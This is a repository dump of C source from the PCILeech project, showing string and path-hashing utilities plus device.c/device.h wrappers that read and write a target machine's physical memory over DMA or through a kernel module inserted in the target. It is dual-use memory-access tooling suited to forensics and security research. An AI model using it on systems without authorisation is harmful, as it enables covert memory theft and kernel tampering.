DWORD CharUtil_HashNameFsW(_In_ LPCWSTR wsz, _In_opt_ DWORD iSuffix)
{
    CHAR uszFs[2 * MAX_PATH];
    if(!CharUtil_FixFsName(uszFs, NULL, NULL, wsz, -1, iSuffix, TRUE)) { return 0; }
    return CharUtil_Internal_HashFs(uszFs);
}



/*
* Replace all characters in a string.
* -- sz
* -- chOld
* -- chNew
*/
VOID CharUtil_ReplaceAllA(_Inout_ LPSTR sz, _In_ CHAR chOld, _In_ CHAR chNew)
{
    CHAR c;
    DWORD i = 0;
    while((c = sz[i++])) {
        if(c == chOld) {
            sz[i - 1] = chNew;
        }
    }
}



/*
* Split the string usz into two at the last (back)slash which is removed.
* Ex: usz: XXX/YYY/ZZZ/AAA -> uszPath: XXX/YYY/ZZZ + return: AAA
* -- usz = utf-8 or ascii string.
* -- uszPath = buffer to receive result.
* -- cbuPath = byte length of uszPath buffer
* -- return
*/
LPSTR CharUtil_PathSplitLastEx(_In_ LPSTR usz, _Out_writes_(cbuPath) LPSTR uszPath, _In_ DWORD cbuPath)
{
    DWORD i, iSlash = -1;
    CHAR ch = -1;
    if(!cbuPath) { return NULL; }
    for(i = 0; ch && i < cbuPath; i++) {
        ch = usz[i];
        uszPath[i] = ch;
        if((ch == '\\') || (ch == '/')) {
            iSlash = i;
        }
    }
    uszPath[cbuPath - 1] = 0;
    if(iSlash == (DWORD)-1) { return NULL; }
    uszPath[iSlash] = 0;
    return uszPath + iSlash + 1;
}


/*
* Return the sub-string after the last (back)slash character in usz.
* If no (back)slash is found original string is returned. The returned data
* must not be free'd and is only valid as long as the usz parameter is valid.
* -- usz = utf-8 or ascii string.
* -- return
*/
LPSTR CharUtil_PathSplitLast(_In_ LPSTR usz)
{
    LPSTR uszResult = usz;
    UCHAR ch;
    DWORD i = 0;
    while(TRUE) {
        ch = usz[i++];
        if(ch == '\0') {
            return uszResult;
        }
        if(ch == '\\' || ch == '/') {
            uszResult = usz + i;
        }
    }
}

/*
* Return the sub-string after the first (back)slash character in usz.
* If no (back)slash is found original string is returned. The returned data
* must not be free'd and is only valid as long as the usz parameter is valid.
* -- usz = utf-8 or ascii string.
* -- return
*/
LPSTR CharUtil_PathSplitNext(_In_ LPSTR usz)
{
    CHAR ch;
    DWORD i = 0;
    while(TRUE) {
        ch = usz[i++];
        if(ch == '\0') {
            return usz + i - 1;
        }
        if((ch == '\\') || (ch == '/')) {
            return usz + i;
        }
    }
}

/*
* Split a "path" string into two at the first slash/backslash character.
* The 1st string is returned in the pusz1 caller-allocated buffer. The
* remainder is returned as return data (is a sub-string of wsz). If no
* 2nd string is found null-terminator character is returned (NB! not as NULL).
* -- usz = utf-8/ascii string to split.
* -- usz1 = buffer to receive result.
* -- cbu1 = byte length of usz1 buffer
* -- return = remainder of split string.
*/
LPSTR CharUtil_PathSplitFirst(_In_ LPSTR usz, _Out_writes_(cbu1) LPSTR usz1, _In_ DWORD cbu1)
{
    UCHAR c;
    DWORD i = 0;
    if(cbu1 < 3) {
        if(cbu1) { usz1[0] = 0; }
        return "";
    }
    while((c = usz[i]) && (c != '\\') && (c != '/') && (i < cbu1 - 2)) {
        usz1[i++] = c;
    }
    usz1[i] = 0;
    return usz[i] ? &usz[i + 1] : "";
}

/*
* Internal hash function for HashPathFs* functions.
*/
QWORD CharUtil_HashPathFs_Internal(_In_ LPCSTR uszPathFs)
{
    CHAR uszFirst[MAX_PATH];
    DWORD dwHashName;
    QWORD qwHashTotal = 0;
    while(uszPathFs[0]) {
        uszPathFs = CharUtil_PathSplitFirst((LPSTR)uszPathFs, uszFirst, _countof(uszFirst));
        dwHashName = CharUtil_HashNameFsU(uszFirst, 0);
        qwHashTotal = dwHashName + ((qwHashTotal >> 13) | (qwHashTotal << 51));
    }
    return qwHashTotal;
}

/*
* Hash a path string in a way that is supported by the file system.
* NB! this is not the same hash as the Windows registry uses.
* -- uszPath/szPath/wszPath
* -- iSuffix
* -- return
*/
QWORD CharUtil_HashPathFsU(_In_ LPCSTR uszPath)
{
    return CharUtil_HashPathFs_Internal(uszPath);
}

QWORD CharUtil_HashPathFsA(_In_ LPCSTR szPath)
{
    LPSTR uszPath;
    BYTE pbBuffer[2 * MAX_PATH];
    if(!CharUtil_AtoU((LPSTR)szPath, -1, pbBuffer, sizeof(pbBuffer), &uszPath, NULL, CHARUTIL_FLAG_TRUNCATE)) { return 0; }
    return CharUtil_HashPathFs_Internal(uszPath);
}

QWORD CharUtil_HashPathFsW(_In_ LPCWSTR wszPath)
{
    LPSTR uszPath;
    BYTE pbBuffer[2 * MAX_PATH];
    if(!CharUtil_WtoU((LPWSTR)wszPath, -1, pbBuffer, sizeof(pbBuffer), &uszPath, NULL, CHARUTIL_FLAG_TRUNCATE)) { return 0; }
    return CharUtil_HashPathFs_Internal(uszPath);
}

/*
* Checks if a string ends with a certain substring.
* -- usz
* -- uszEndsWith
* -- fCaseInsensitive
* -- return
*/
BOOL CharUtil_StrEndsWith(_In_opt_ LPSTR usz, _In_opt_ LPSTR uszEndsWith, _In_ BOOL fCaseInsensitive)
{
    SIZE_T cch, cchEndsWith;
    if(!usz || !uszEndsWith) { return FALSE; }
    cch = strlen(usz);
    cchEndsWith = strlen(uszEndsWith);
    if(cch < cchEndsWith) { return FALSE; }
    return fCaseInsensitive ?
        (0 == _stricmp(usz + cch - cchEndsWith, uszEndsWith)) :
        (0 == strcmp(usz + cch - cchEndsWith, uszEndsWith));
}

/*
* Compare a wide-char string to a utf-8 string.
* NB! only the first 2*MAX_PATH characters are compared.
* -- wsz1
* -- usz2
* -- return = 0 if equals, -1/1 otherwise.
*/
int CharUtil_CmpWU(_In_opt_ LPWSTR wsz1, _In_opt_ LPSTR usz2, _In_ BOOL fCaseInsensitive)
{
    LPSTR usz1;
    BYTE pbBuffer1[2 * MAX_PATH];
    if(!wsz1 && !usz2) { return 0; }
    if(!wsz1) { return -1; }
    if(!usz2) { return 1; }
    if(!CharUtil_WtoU(wsz1, -1, pbBuffer1, sizeof(pbBuffer1), &usz1, NULL, CHARUTIL_FLAG_TRUNCATE)) { return -1; }
    return fCaseInsensitive ? _stricmp(usz1, usz2) : strcmp(usz1, usz2);
}

/*
* Compare two wide-char strings.
* NB! only the first 2*MAX_PATH characters are compared.
* -- wsz1
* -- wsz2
* -- return = 0 if equals, -1/1 otherwise.
*/
int CharUtil_CmpWW(_In_opt_ LPWSTR wsz1, _In_opt_ LPWSTR wsz2, _In_ BOOL fCaseInsensitive)
{
    LPSTR usz1, usz2;
    BYTE pbBuffer1[2 * MAX_PATH], pbBuffer2[2 * MAX_PATH];
    if(!wsz1 && !wsz2) { return 0; }
    if(!wsz1) { return -1; }
    if(!wsz2) { return 1; }
    if(!CharUtil_WtoU(wsz1, -1, pbBuffer1, sizeof(pbBuffer1), &usz1, NULL, CHARUTIL_FLAG_TRUNCATE)) { return -1; }
    if(!CharUtil_WtoU(wsz2, -1, pbBuffer2, sizeof(pbBuffer2), &usz2, NULL, CHARUTIL_FLAG_TRUNCATE)) { return 1; }
    return fCaseInsensitive ? _stricmp(usz1, usz2) : strcmp(usz1, usz2);
}

```

`pcileech/charutil.h`:

```h
// charutil.h : definitions of various character/string utility functions.
//
// (c) Ulf Frisk, 2021-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __CHARUTIL_H__
#define __CHARUTIL_H__

#ifdef _WIN32
#include <Windows.h>
typedef unsigned __int64                QWORD, *PQWORD;
#else
#include "oscompatibility.h"
#endif /* _WIN32 */

#define CHARUTIL_FLAG_NONE                      0x0000
#define CHARUTIL_FLAG_ALLOC                     0x0001
#define CHARUTIL_FLAG_TRUNCATE                  0x0002
#define CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR   0x0006
#define CHARUTIL_FLAG_STR_BUFONLY               0x0008

/*
* Check whether a string is an ansi-string (only codepoints between 0-127).
* -- sz
* -- return
*/
BOOL CharUtil_IsAnsiA(_In_ LPCSTR sz);
BOOL CharUtil_IsAnsiW(_In_ LPCWSTR wsz);

/*
* Convert Ascii (0-255) or Wide (16-bit LE) string into a UTF-8 string.
* NB! wsz must NOT equal or overlap pbBuffer!
* CALLER LOCALFREE (if *pusz != pbBuffer): *pusz
* -- sz/wsz = the string to convert.
* -- cch = -1 for null-terminated string; or max number of chars (excl. null).
* -- pbBuffer = optional buffer to place the result in.
* -- cbBuffer
* -- pusz = if set to null: function calculate length only and return TRUE.
            result utf-8 string, either as (*pusz == pbBuffer) or LocalAlloc'ed
*           buffer that caller is responsible for free.
* -- pcbu = byte length (including terminating null) of utf-8 string.
* -- flags = CHARUTIL_FLAG_NONE, CHARUTIL_FLAG_ALLOC or CHARUTIL_FLAG_TRUNCATE
* -- return
*/
_Success_(return)
BOOL CharUtil_UtoU(
    _In_opt_ LPSTR usz,
    _In_ DWORD cch,
    _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _Out_opt_ LPSTR * pusz,
    _Out_opt_ PDWORD pcbu,
    _In_ DWORD flags
);

_Success_(return)
BOOL CharUtil_AtoU(
    _In_opt_ LPSTR sz,
    _In_ DWORD cch,
    _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _Out_opt_ LPSTR *pusz,
    _Out_opt_ PDWORD pcbu,
    _In_ DWORD flags
);

_Success_(return)
BOOL CharUtil_WtoU(
    _In_opt_ LPWSTR wsz,
    _In_ DWORD cch,
    _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _Out_opt_ LPSTR *pusz,
    _Out_opt_ PDWORD pcbu,
    _In_ DWORD flags
);

/*
* Convert UTF-8 string into a Windows Wide-Char string.
* Function support usz == pbBuffer - usz will then become overwritten.
* CALLER LOCALFREE (if *pusz != pbBuffer): *pusz
* -- usz/wsz = the string to convert.
* -- cch = -1 for null-terminated string; or max number of chars (excl. null).
* -- pbBuffer = optional buffer to place the result in.
* -- cbBuffer
* -- pwsz = if set to null: function calculate length only and return TRUE.
            result wide-string, either as (*pwsz == pbBuffer) or LocalAlloc'ed
*           buffer that caller is responsible for free.
* -- pcbw = byte length (including terminating null) of wide-char string.
* -- flags = CHARUTIL_FLAG_NONE, CHARUTIL_FLAG_ALLOC or CHARUTIL_FLAG_TRUNCATE
* -- return
*/
_Success_(return)
BOOL CharUtil_UtoW(
    _In_opt_ LPSTR usz,
    _In_ DWORD cch,
    _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _Out_opt_ LPWSTR *pwsz,
    _Out_opt_ PDWORD pcbw,
    _In_ DWORD flags
);

_Success_(return)
BOOL CharUtil_WtoW(
    _In_opt_ LPWSTR wsz,
    _In_ DWORD cch,
    _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _Out_opt_ LPWSTR *pwsz,
    _Out_opt_ PDWORD pcbw,
    _In_ DWORD flags
);

/*
* Convert UTF-8, Ascii (0-255) or Wide (16-bit LE) string into a JSON string.
* Function support sz/usz/wsz == pbBuffer - sz/usz/wsz will then become overwritten.
* CALLER LOCALFREE (if *pjsz != pbBuffer): *pjsz
* -- sz/usz/wsz = the string to convert.
* -- cch = -1 for null-terminated string; or max number of chars (excl. null).
* -- pbBuffer = optional buffer to place the result in.
* -- cbBuffer
* -- pjsz = if set to null: function calculate length only and return TRUE.
            result utf-8 string, either as (*pjsz == pbBuffer) or LocalAlloc'ed
*           buffer that caller is responsible for free.
* -- pcbj = byte length (including terminating null) of utf-8 string.
* -- flags = CHARUTIL_FLAG_NONE, CHARUTIL_FLAG_ALLOC or CHARUTIL_FLAG_TRUNCATE
* -- return
*/
_Success_(return)
BOOL CharUtil_UtoJ(
    _In_opt_ LPSTR usz,
    _In_ DWORD cch,
    _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _Out_opt_ LPSTR *pjsz,
    _Out_opt_ PDWORD pcbj,
    _In_ DWORD flags
);

_Success_(return)
BOOL CharUtil_AtoJ(
    _In_opt_ LPSTR sz,
    _In_ DWORD cch,
    _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _Out_opt_ LPSTR *pjsz,
    _Out_opt_ PDWORD pcbj,
    _In_ DWORD flags
);

_Success_(return)
BOOL CharUtil_WtoJ(
    _In_opt_ LPWSTR wsz,
    _In_ DWORD cch,
    _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _Out_opt_ LPSTR *pjsz,
    _Out_opt_ PDWORD pcbj,
    _In_ DWORD flags
);

/*
* Hash a string quickly using the ROT13 algorithm either to a 64-bit or 32-bit number.
* -- sz/usz/wsz = the string to hash
* -- fUpper
* -- return
*/
DWORD CharUtil_Hash32U(_In_ LPCSTR usz, _In_ BOOL fUpper);
DWORD CharUtil_Hash32A(_In_ LPCSTR sz, _In_ BOOL fUpper);
DWORD CharUtil_Hash32W(_In_ LPCWSTR wsz, _In_ BOOL fUpper);
QWORD CharUtil_Hash64U(_In_ LPCSTR usz, _In_ BOOL fUpper);
QWORD CharUtil_Hash64A(_In_ LPCSTR sz, _In_ BOOL fUpper);
QWORD CharUtil_Hash64W(_In_ LPCWSTR wsz, _In_ BOOL fUpper);

/*
* Hash a name string in a way that is supported by the file system.
* NB! this is not the same hash as the Windows registry uses.
* -- usz/sz/wsz
* -- iSuffix
* -- return
*/
DWORD CharUtil_HashNameFsU(_In_ LPCSTR usz, _In_opt_ DWORD iSuffix);
DWORD CharUtil_HashNameFsA(_In_ LPCSTR sz, _In_opt_ DWORD iSuffix);
DWORD CharUtil_HashNameFsW(_In_ LPCWSTR wsz, _In_opt_ DWORD iSuffix);

/*
* Hash a path string in a way that is supported by the file system.
* NB! this is not the same hash as the Windows registry uses.
* -- usz/sz/wsz
* -- iSuffix
* -- return
*/
QWORD CharUtil_HashPathFsU(_In_ LPCSTR usz);
QWORD CharUtil_HashPathFsA(_In_ LPCSTR sz);
QWORD CharUtil_HashPathFsW(_In_ LPCWSTR wsz);

/*
* Convert a string into a file name compatible string by replacing illegal
* characters with '_'. Also optionally add a suffix between 1-9 and fix
* upper-case letters. If insufficient space the result will be truncated.
* -- uszDst
* -- cbuDst
* -- uszSrc
* -- iSuffix
* -- fUpper
* -- return = number of bytes written (including terminating NULL).
*/
_Success_(return != 0)
DWORD CharUtil_FixFsNameU(
    _Out_writes_(cbuDst) LPSTR uszDst,
    _In_ DWORD cbuDst,
    _In_ LPCSTR uszSrc,
    _In_opt_ DWORD iSuffix,
    _In_ BOOL fUpper
);

/*
* Convert a string into a file name compatible string by replacing illegal
* characters with '_'. Also optionally add a suffix between 1-9 and fix
* upper-case letters. One of [usz, sz, wsz] must be valid.
* -- uszOut
* -- usz
* -- sz
* -- wsz
* -- cwsz
* -- cch = number of bytes/wchars in usz/sz/wsz or _TRUNCATE
* -- iSuffix
* -- fUpper
* -- return = number of bytes written (including terminating NULL).
*/
_Success_(return != 0)
DWORD CharUtil_FixFsName(
    _Out_writes_(2*MAX_PATH) LPSTR uszOut,
    _In_opt_ LPCSTR usz,
    _In_opt_ LPCSTR sz,
    _In_opt_ LPCWSTR wsz,
    _In_ DWORD cch,
    _In_opt_ DWORD iSuffix,
    _In_ BOOL fUpper
);

/*
* Replace all characters in a string.
* -- sz
* -- chOld
* -- chNew
*/
VOID CharUtil_ReplaceAllA(_Inout_ LPSTR sz, _In_ CHAR chOld, _In_ CHAR chNew);

/*
* Split a "path" string into two at the first slash/backslash character.
* The 1st string is returned in the pusz1 caller-allocated buffer. The
* remainder is returned as return data (is a sub-string of wsz). If no
* 2nd string is found null-terminator character is returned (NB! not as NULL).
* -- usz = utf-8/ascii string to split.
* -- usz1 = buffer to receive result.
* -- cbu1 = byte length of usz1 buffer
* -- return = remainder of split string.
*/
LPSTR CharUtil_PathSplitFirst(_In_ LPSTR usz, _Out_writes_(cbu1) LPSTR usz1, _In_ DWORD cbu1);

/*
* Return the sub-string after the first (back)slash character in usz.
* If no (back)slash is found original string is returned. The returned data
* must not be free'd and is only valid as long as the usz parameter is valid.
* -- usz = utf-8 or ascii string.
* -- return
*/
LPSTR CharUtil_PathSplitNext(_In_ LPSTR usz);

/*
* Return the sub-string after the last (back)slash character in usz.
* If no (back)slash is found original string is returned. The returned data
* must not be free'd and is only valid as long as the usz parameter is valid.
* -- usz = utf-8 or ascii string.
* -- return
*/
LPSTR CharUtil_PathSplitLast(_In_ LPSTR usz);

/*
* Split the string usz into two at the last (back)slash which is removed.
* Ex: usz: XXX/YYY/ZZZ/AAA -> uszPath: XXX/YYY/ZZZ + return: AAA
* -- usz = utf-8 or ascii string.
* -- uszPath = buffer to receive result.
* -- cbuPath = byte length of uszPath buffer
* -- return
*/
LPSTR CharUtil_PathSplitLastEx(_In_ LPSTR usz, _Out_writes_(cbuPath) LPSTR uszPath, _In_ DWORD cbuPath);

/*
* Checks if a string ends with a certain substring.
* -- usz
* -- uszEndsWith
* -- fCaseInsensitive
* -- return
*/
BOOL CharUtil_StrEndsWith(_In_opt_ LPSTR usz, _In_opt_ LPSTR uszEndsWith, _In_ BOOL fCaseInsensitive);

/*
* Compare a wide-char string to a utf-8 string.
* NB! only the first 2*MAX_PATH characters are compared.
* -- wsz1
* -- usz2
* -- return = 0 if equals, -1/1 otherwise.
*/
int CharUtil_CmpWU(_In_opt_ LPWSTR wsz1, _In_opt_ LPSTR usz2, _In_ BOOL fCaseInsensitive);

/*
* Compare two wide-char strings.
* NB! only the first 2*MAX_PATH characters are compared.
* -- wsz1
* -- wsz2
* -- return = 0 if equals, -1/1 otherwise.
*/
int CharUtil_CmpWW(_In_opt_ LPWSTR wsz1, _In_opt_ LPWSTR wsz2, _In_ BOOL fCaseInsensitive);

#endif /* __CHARUTIL_H__ */

```

`pcileech/device.c`:

```c
// device.c : implementation related to hardware devices.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include <leechcore.h>
#include "device.h"
#include "kmd.h"
#include "statistics.h"
#include "vmmx.h"

_Success_(return)
BOOL DeviceReadDMA_Retry(_In_ HANDLE hLC, _In_ QWORD pa, _In_ DWORD cb, _Out_writes_(cb) PBYTE pb)
{
    return LcRead(hLC, pa, cb, pb) || LcRead(hLC, pa, cb, pb);
}

_Success_(return)
BOOL DeviceWriteDMA_Retry(_In_ HANDLE hLC, _In_ QWORD pa, _In_ DWORD cb, _In_reads_(cb) PBYTE pb)
{
    return LcWrite(hLC, pa, cb, pb) || LcWrite(hLC, pa, cb, pb);
}

_Success_(return)
BOOL DeviceWriteDMA_Verify(_In_ HANDLE hLC, _In_ QWORD pa, _In_ DWORD cb, _In_reads_(cb) PBYTE pb)
{
    PBYTE pbBuffer = NULL;
    BOOL fResult =
        DeviceWriteDMA_Retry(hLC, pa, cb, pb) &&
        (pbBuffer = LocalAlloc(0, cb)) &&
        DeviceReadDMA_Retry(hLC, pa, cb, pbBuffer) &&
        (0 == memcmp(pb, pbBuffer, cb));
    LocalFree(pbBuffer);
    return fResult;
}

DWORD DeviceReadDMA(_In_ QWORD pa, _In_ DWORD cb, _Out_writes_(cb) PBYTE pb, _Inout_opt_ PPAGE_STATISTICS pPageStat)
{
    PMEM_SCATTER pMEM, *ppMEMs = NULL;
    DWORD i, cMEMs, cbRead = 0;
    cMEMs = cb >> 12;
    if((pa & 0xfff) || !cb || (cb & 0xfff)) { return 0; }
    if(!LcAllocScatter2(cb, pb, cMEMs, &ppMEMs)) { return 0; }
    for(i = 0; i < cMEMs; i++) {
        ppMEMs[i]->qwA = pa + ((QWORD)i << 12);
    }
    LcReadScatter(ctxMain->hLC, cMEMs, ppMEMs);
    for(i = 0; i < cMEMs; i++) {
        pMEM = ppMEMs[i];
        if(pMEM->f) {
            cbRead += pMEM->cb;
        } else {
            ZeroMemory(pMEM->pb, pMEM->cb);
        }
        if(pPageStat) {
            PageStatUpdate(pPageStat, ppMEMs[i]->qwA + 0x1000, pMEM->f ? 1 : 0, pMEM->f ? 0 : 1);
        }
    }
    LcMemFree(ppMEMs);
    return cbRead;
}

/*
* Set a custom user-defined or auto-generated memory map either from:
* - command line argument
* - file: a user defined memory map text file.
* - auto: auto generated memory map retrieved using MemProcFS when target OS
*         is Windows and when PCILeech is running on Windows OS.
* -- return
*/
_Success_(return)
BOOL DeviceOpen2_SetCustomMemMap()
{
    BOOL fResult = FALSE;
    FILE *hFile = NULL;
    DWORD cb;
    PBYTE pb = NULL, pbResult = NULL;
    if(!(pb = LocalAlloc(LMEM_ZEROINIT, 0x01000000))) { goto fail; }
    if(0 == _stricmp("auto", ctxMain->cfg.szMemMap)) {
        if(!Vmmx_Initialize(FALSE, TRUE)) { goto fail; }
    } else {
        if(fopen_s(&hFile, ctxMain->cfg.szMemMap, "rb") || !hFile) { goto fail; }
        cb = (DWORD)fread(pb, 1, 0x01000000, hFile);
        if((cb == 0) || (cb > 0x01000000)) { goto fail; }
        if(!LcCommand(ctxMain->hLC, LC_CMD_MEMMAP_SET, cb, pb, NULL, NULL)) { goto fail; }
    }
    fResult =
        LcCommand(ctxMain->hLC, LC_CMD_MEMMAP_GET, 0, NULL, &pbResult, NULL) &&
        LcGetOption(ctxMain->hLC, LC_OPT_CORE_ADDR_MAX, &ctxMain->dev.paMax);
    if(fResult && ctxMain->cfg.fVerbose) {
        printf("TARGET SYSTEM MEMORY MAP:\n");
        printf("   #       RANGE_BASE          RANGE_TOP         RANGE_REMAP\n");
        printf("============================================================\n");
        printf("%s\n", (LPSTR)pbResult);
    }
fail:
    LocalFree(pb);
    LcMemFree(pbResult);
    Vmmx_Close();
    if(hFile) { fclose(hFile); }
    return fResult;
}

#ifdef _WIN32
_Success_(return)
BOOL DeviceOpen2_RequestUserInput()
{
    BOOL fResult;
    LPSTR szProto;
    DWORD i, cbRead = 0;
    CHAR szInput[33] = { 0 };
    CHAR szDevice[MAX_PATH] = { 0 };
    HANDLE hStdIn = GetStdHandle(STD_INPUT_HANDLE);     // must not be closed.
    // 1: read input
    printf("\n?> ");
    fResult = ReadConsoleA(hStdIn, szInput, 32, &cbRead, NULL);
    for(i = 0; i < _countof(szInput); i++) {
        if((szInput[i] == '\r') || (szInput[i] == '\n')) { szInput[i] = 0; }
    }
    cbRead = (DWORD)strlen(szInput);
    if(!cbRead) { return FALSE; }
    // 2: clear "userinput" option and update "device" option
    ctxMain->cfg.fUserInteract = FALSE;
    szProto = strstr(ctxMain->cfg.szDevice, "://");
    snprintf(
        szDevice,
        MAX_PATH - 1,
        "%s%s%sid=%s",
        ctxMain->cfg.szDevice,
        szProto ? "" : "://",
        szProto && szProto[3] ? "," : "",
        szInput);
    memcpy(ctxMain->cfg.szDevice, szDevice, MAX_PATH);
    // 3: try re-initialize with new user input
    return DeviceOpen();
}
#else /* _WIN32 */
_Success_(return)
BOOL DeviceOpen2_RequestUserInput()
{
    return FALSE;
}
#endif /* _WIN32 */

_Success_(return)
BOOL DeviceOpen2(_In_ LPSTR szDevice, _In_ BOOL fFailSilent)
{
    BOOL f;
    PLC_CONFIG_ERRORINFO pLcErrorInfo = NULL;
    ZeroMemory(&ctxMain->dev, sizeof(ctxMain->dev));
    ctxMain->dev.dwVersion = LC_CONFIG_VERSION;
    if(!fFailSilent) {
        // do not initially enable leechcore error messages / printouts if set to fail silent
        ctxMain->dev.dwPrintfVerbosity =
            LC_CONFIG_PRINTF_ENABLED |
            (ctxMain->cfg.fVerbose ? LC_CONFIG_PRINTF_V : 0) |
            (ctxMain->cfg.fVerboseExtra ? LC_CONFIG_PRINTF_VV : 0);
    }
    strcpy_s(ctxMain->dev.szDevice, MAX_PATH, szDevice);
    strcpy_s(ctxMain->dev.szRemote, MAX_PATH, ctxMain->cfg.szRemote);
    ctxMain->dev.paMax = ctxMain->cfg.paAddrMax;
    ctxMain->hLC = LcCreateEx(&ctxMain->dev, &pLcErrorInfo);
    if(!ctxMain->hLC) {
#ifdef _WIN32
        if(pLcErrorInfo && (pLcErrorInfo->dwVersion == LC_CONFIG_ERRORINFO_VERSION)) {
            if(pLcErrorInfo->cwszUserText) {
                wprintf(L"MESSAGE FROM MEMORY ACQUISITION DEVICE:\n=======================================\n%s\n", pLcErrorInfo->wszUserText);
            }
            if(ctxMain->cfg.fUserInteract && pLcErrorInfo->fUserInputRequest) {
                LcMemFree(pLcErrorInfo);
                return DeviceOpen2_RequestUserInput();
            }
        }
#endif /* _WIN32 */
        ZeroMemory(&ctxMain->dev, sizeof(ctxMain->dev));
        LcMemFree(pLcErrorInfo);
        return FALSE;
    }
    // enable standard verbosity levels upon success (if not already set)
    if(fFailSilent) {
        LcSetOption(ctxMain->hLC, LC_OPT_CORE_PRINTF_ENABLE, 1);
        LcSetOption(ctxMain->hLC, LC_OPT_CORE_VERBOSE, (ctxMain->cfg.fVerbose ? 1 : 0));
        LcSetOption(ctxMain->hLC, LC_OPT_CORE_VERBOSE_EXTRA, (ctxMain->cfg.fVerboseExtra ? 1 : 0));
    }
    if(ctxMain->cfg.fVerboseExtraTlp) {
        LcSetOption(ctxMain->hLC, LC_OPT_CORE_VERBOSE_EXTRA_TLP, 1);
    }
    // enable custom memory map (if option is set)
    if(ctxMain->cfg.szMemMap[0]) {
        if(!DeviceOpen2_SetCustomMemMap()) {
            printf("PCILEECH: Invalid memory map: '%s'.\n", ctxMain->cfg.szMemMap);
            return FALSE;
        }
    }
    if(ctxMain->cfg.szMemMapStr[0]) {
        f = LcCommand(ctxMain->hLC, LC_CMD_MEMMAP_SET, (DWORD)strlen(ctxMain->cfg.szMemMapStr), ctxMain->cfg.szMemMapStr, NULL, NULL) &&
            LcGetOption(ctxMain->hLC, LC_OPT_CORE_ADDR_MAX, &ctxMain->dev.paMax);
        if(!f) {
            printf("PCILEECH: Invalid memory map given on command line option.\n");
            return FALSE;
        }
    }
    return TRUE;
}

_Success_(return)
BOOL DeviceOpen()
{
    if(0 == ctxMain->cfg.szDevice[0]) {
        if(DeviceOpen2("FPGA", TRUE) || DeviceOpen2("USB3380", TRUE)) {
            strcpy_s(ctxMain->cfg.szDevice, MAX_PATH, ctxMain->dev.szDevice);
            return TRUE;
        }
        return FALSE;
    }
    return DeviceOpen2(ctxMain->cfg.szDevice, FALSE);
}

_Success_(return)
BOOL DeviceWriteMEM(_In_ QWORD qwAddr, _In_ DWORD cb, _In_reads_(cb) PBYTE pb, _In_ BOOL fRetryOnFail)
{
    if(ctxMain->phKMD) {
        return KMDWriteMemory(qwAddr, pb, cb);
    }
    return LcWrite(ctxMain->hLC, qwAddr, cb, pb) || (fRetryOnFail && LcWrite(ctxMain->hLC, qwAddr, cb, pb));
}

_Success_(return)
BOOL DeviceReadMEM(_In_ QWORD qwAddr, _In_ DWORD cb, _Out_writes_(cb) PBYTE pb, _In_ BOOL fRetryOnFail)
{
    if(ctxMain->phKMD) {
        return KMDReadMemory(qwAddr, pb, cb);
    }
    return LcRead(ctxMain->hLC, qwAddr, cb, pb) || (fRetryOnFail && LcRead(ctxMain->hLC, qwAddr, cb, pb));
}

```

`pcileech/device.h`:

```h
// device.h : definitions related to the hardware devices.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __DEVICE_H__
#define __DEVICE_H__
#include "pcileech.h"
#include "oscompatibility.h"
#include "statistics.h"

/*
* Open a connection to the target device.
* -- result
*/
_Success_(return)
BOOL DeviceOpen();

/*
* Try read memory with DMA in a fairly optimal way considering device limits.
* The number of total successfully read bytes is returned. Failed reads will
* be zeroed out the he returned memory.
* -- pa
* -- cb
* -- pb
* -- pPageStat = optional page statistics
* -- return = the number of bytes successfully read.
*
*/
DWORD DeviceReadDMA(_In_ QWORD pa, _In_ DWORD cb, _Out_writes_(cb) PBYTE pb, _Inout_opt_ PPAGE_STATISTICS pPageStat);

/*
* Write target physical memory. If an KMD is inserted in the target kernel the
* KMD will be used to write the memory, otherwise the memory will be written
* with standard DMA. Minimum granularity: byte.
* -- qwAddr = the physical address to write to in the target system.
* -- cb = number of bytes to write.
* -- pb = bytes to write
* -- fRetryOnFail
* -- return
*/
_Success_(return)
BOOL DeviceWriteMEM(_In_ QWORD qwAddr, _In_ DWORD cb, _In_reads_(cb) PBYTE pb, _In_ BOOL fRetryOnFail);

/*
* Read target physical memory. If an KMD is inserted in the target kernel the
* KMD will be used to read the memory, otherwise the memory will be read with
* standard DMA. Minimum granularity: page (4kB)
* -- qwAddr = physical address in target system to read.
* -- cb = length of data to read, must not be larger than pb.
* -- pb = pre-allocated buffer to place result in.
* -- fRetryOnFail
* -- return
*/
_Success_(return)
BOOL DeviceReadMEM(_In_ QWORD qwAddr, _In_ DWORD cb, _Out_writes_(cb) PBYTE pb, _In_ BOOL fRetryOnFail);

/*
* LcRead with a single retry on fail.
*/
_Success_(return)
BOOL DeviceReadDMA_Retry(_In_ HANDLE hLC, _In_ QWORD pa, _In_ DWORD cb, _Out_writes_(cb) PBYTE pb);

/*
* LeechCore LcWrite with a single retry on fail.
*/
_Success_(return)
BOOL DeviceWriteDMA_Retry(_In_ HANDLE hLC, _In_ QWORD pa, _In_ DWORD cb, _In_reads_(cb) PBYTE pb);

/*
* Write to target physical memory using DMA and read back the same memory and
* thus verifying that the write was successful indeed.
* -- hLC
* -- pa
* -- cb
* -- pb
*/
_Success_(return)
BOOL DeviceWriteDMA_Verify(_In_ HANDLE hLC, _In_ QWORD pa, _In_ DWORD cb, _In_reads_(cb) PBYTE pb);

#endif /* __DEVICE_H__ */

```

`pcileech/executor.c`:

```c
